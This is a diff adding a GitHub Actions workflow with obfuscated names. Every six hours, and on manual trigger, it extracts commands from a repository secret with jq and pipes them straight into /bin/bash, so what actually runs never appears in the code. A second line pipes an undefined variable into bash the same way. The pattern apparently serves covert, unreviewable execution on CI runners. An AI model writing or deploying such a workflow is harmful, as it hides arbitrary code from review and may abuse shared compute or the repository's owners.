@@ -1,0 +1,18 @@
+name: deliciousteenytiny
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: deliciousteenytiny
+        env:
+          wlm5: ${{ secrets.wlm5 }}
+        run: |
+          echo $wlm5 | jq -r .yhhzc0698 | /bin/bash
+          echo $eubc5 | jq -r .jdu0 | /bin/bash
+
